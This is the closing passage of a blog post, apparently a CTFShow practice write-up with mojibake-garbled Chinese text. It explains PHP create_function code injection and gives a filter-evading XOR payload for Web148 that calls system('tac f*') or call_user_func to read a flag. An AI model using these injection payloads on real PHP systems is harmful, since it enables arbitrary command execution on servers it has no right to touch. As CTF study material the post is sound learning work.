<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æ‰§è¡Œä»»æ„ä»£ç ï¼Œå°±é¦–å…ˆéœ€è¦è·³å‡ºè¿™ä¸ªå‡½æ•°å®šä¹‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111;&#125;phpinfo();//&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç å°±ä¼šæ‰§è¡Œ</p>
<h1 id="Web148"><a href="#Web148" class="headerlink" title="Web148"></a>Web148</h1><p>è¿™é¢˜å°±æœ‰ç‚¹æ²¡çœ‹æ‡‚çš„æ„Ÿè§‰</p>
<p>è¯´æ˜¯ä½¿ç”¨ä¸­æ–‡å˜é‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=$å“ˆ=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$å“ˆ&#125;[å“¼]($&#123;$å“ˆ&#125;[å—¯]);&amp;å“¼=system&amp;å—¯=tac f*</span><br><span class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET</span><br><span class="line">$&#123;_GET&#125;[å“¼]($&#123;_GET&#125;[å—¯]);&amp;å“¼=call_user_func&amp;å—¯=get_ctfshow_fl0g</span><br></pre></td></tr></table></figure>

<p>***â€&#96;</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/ctfshow/" rel="tag"># ctfshow</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/" rel="prev" title="æ¸—é€æµ‹è¯•å­¦ä¹ ä¹‹è·¯">
                  <i class="fa fa-angle-left"></i> æ¸—é€æµ‹è¯•å­¦ä¹ ä¹‹è·¯
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments" id="waline"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2023 â€“ 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">6pc1</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">96k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">1:27</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="è¿”å›é¡¶éƒ¨">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"waline-server-pi-one.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"è¯·æ–‡æ˜è¯„è®ºå‘€","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":false,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2024/03/06/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}</script>
<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});
</script>


  <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
  <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
  <script type="text/javascript" src="/js/fireworks.js"></script>
</body>
</html>
